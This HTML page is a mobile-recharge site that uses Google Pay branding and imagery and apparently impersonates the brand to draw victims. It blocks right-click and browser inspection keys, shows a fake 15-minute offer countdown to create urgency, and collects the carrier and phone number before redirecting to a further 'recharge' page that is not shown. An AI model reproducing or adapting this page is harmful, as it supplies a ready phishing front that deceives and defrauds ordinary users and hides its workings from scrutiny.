<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <link rel="icon" href="assets/img/gpay.jpg" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <meta name="theme-color" content="#000000" />
        <meta name="description" content="Web site created using create-react-app" />
        <link rel="apple-touch-icon" href="assets/img/gpaylogo.a859e7ad6e3a2b75843f.png" />
        <title>Google Pay Mobile Recharge New Plans</title>
        <link href="assets/css/style.css" rel="stylesheet" />

        <script>
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault(); // Prevent the default context menu
        });

        // Optionally, you can also prevent F12 (Inspect) key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
    </script>
    
        <!-- Meta Pixel Code -->
        <?php
            include 'pixel.php'; // or require 'pixel.php';
        ?>
        <!-- End Meta Pixel Code -->
    </head>
    <body>
        <noscript>You need to enable JavaScript to run this app.</noscript>
        <div>
            <div class="py-4 px-6 bg-white flex items-center justify-between border-b border-slate-100 mb-0">
                <div class="flex items-center">
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="text-blue-500 mr-3" height="19" width="19" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
                        ></path>
                    </svg>
                    <a href="/"><img src="assets/img/gpaylogo.a859e7ad6e3a2b75843f.png" alt="" class="h-8" /></a>
                </div>
                <div>
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="text-blue-500" height="25" width="25" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"
                        ></path>
                    </svg>
                </div>
            </div>
            <div class="bg-white">
                <div class="px-2"><img src="assets/img/gpaybanner.7eef6b2d81d4cc1cbede.png" alt="" class="rounded-xl" /></div>
                <div>
                    <div class="flex items-center justify-center py-1 px-4 mt-2 bg-blue-50 text-[13px]">
                        <div class="text-slate-700 mr-2">Special Offer Ends In:</div>
                        <div class="text-slate-700 flex items-center">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="mr-[2px] mt-[1px]" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M256,8C119,8,8,119,8,256S119,504,256,504,504,393,504,256,393,8,256,8Zm92.49,313h0l-20,25a16,16,0,0,1-22.49,2.5h0l-67-49.72a40,40,0,0,1-15-31.23V112a16,16,0,0,1,16-16h32a16,16,0,0,1,16,16V256l58,42.5A16,16,0,0,1,348.49,321Z"
                                ></path>
                            </svg>
                            <span id="timer">15:00</span>
                        </div>
                    </div>
                </div>
                <div class="py-10 px-5">
                    <div class="bg-white border border-slate-200 rounded-xl py-4 px-6 shadow-xl shadow-blue-100">
                        <div class="text-blue-500 flex items-center text-[17px] font-bold w-fit mx-auto mb-8">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="30" width="30" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M6 2H18C18.5523 2 19 2.44772 19 3V21C19 21.5523 18.5523 22 18 22H6C5.44772 22 5 21.5523 5 21V3C5 2.44772 5.44772 2 6 2ZM12 17C11.4477 17 11 17.4477 11 18C11 18.5523 11.4477 19 12 19C12.5523 19 13 18.5523 13 18C13 17.4477 12.5523 17 12 17Z"
                                ></path>
                            </svg>
                            <span>Mobile Recharge</span>
                        </div>
                        <form id="rechargeForm">
                            <label class="text-[13px] ml-1 font-bold mt-5">Select Network Provider</label>
                            <div class="mt-2 flex justify-between text-blue-500 text-[14px] font-bold">
                                <div class="border-2 border-blue-500 rounded px-2 py-1">
                                    <input type="radio" id="jio" name="network" class="mr-1 mt-1" value="Jio" checked />
                                    <label for="jio">Jio</label>
                                </div>
                                <div class="border-2 border-blue-500 rounded px-2 py-1">
                                    <input type="radio" id="airtel" name="network" class="mr-1 mt-1" value="Airtel" />
                                    <label for="airtel">Airtel</label>
                                </div>
                                <div class="border-2 border-blue-500 rounded px-2 py-1">
                                    <input type="radio" id="vi" name="network" class="mr-1 mt-1" value="VI" />
                                    <label for="vi">VI</label>
                                </div>
                                <div class="border-2 border-blue-500 rounded px-2 py-1">
                                    <input type="radio" id="bsnl" name="network" class="mr-1 mt-1" value="Bsnl" />
                                    <label for="bsnl">Bsnl</label>
                                </div>
                            </div>
                        
                            <div class="mt-3">
                                <label class="text-[13px] ml-1 font-bold">Mobile Number</label>
                                <input
                                    type="number"
                                    id="mobileNumber"
                                    placeholder="+91 xxxxx xxxxx"
                                    class="bg-white mt-1 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                                />
                                <span id="mobileError" style="color: red; display: none;">Please enter a valid 10-digit mobile number.</span>
                            </div>
                        
                            <div class="mt-5">
                                <button type="submit" class="bg-blue-500 py-3 w-full text-[15px] rounded-xl font-bold text-white">Recharge</button>
                            </div>
                        </form>
                        
                    </div>
                </div>
                <img src="assets/img/gpayfooter.11f558d98dc0e11b50d8.webp" alt="" class="mt-3" />
            </div>
        </div>
    </body>

    <script>
        window.onload = function() {
    // Set the initial time for the countdown (15 minutes)
    let countdown = 15 * 60;

    // Function to update the timer
    function updateTimer() {
        const minutes = Math.floor(countdown / 60);
        const seconds = countdown % 60;

        // Format the time as mm:ss
        const formattedTime = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
        
        // Update the time in the span
        document.getElementById('timer').textContent = formattedTime;

        // Stop the countdown at 0
        if (countdown <= 0) {
            clearInterval(timerInterval);
        }

        // Decrease the countdown
        countdown--;
    }

    // Run the updateTimer function every 1000ms (1 second)
    const timerInterval = setInterval(updateTimer, 1000);
};


document.getElementById('rechargeForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Prevent form submission

    // Get the selected network provider
    const network = document.querySelector('input[name="network"]:checked').value;

    // Get the mobile number
    const mobileNumber = document.getElementById('mobileNumber').value;

    // Validate the mobile number (basic validation for 10 digits)
    const mobileError = document.getElementById('mobileError');
    if (mobileNumber.length !== 10 || isNaN(mobileNumber)) {
        mobileError.style.display = 'block'; // Show error message
        return;
    } else {
        mobileError.style.display = 'none'; // Hide error message
    }

    // Store the data in localStorage
    localStorage.setItem('network', network);
    localStorage.setItem('mobileNumber', mobileNumber);

    // Redirect to the next page (e.g., success.html)
    window.location.href = 'recharge';
});


    </script>
</html>
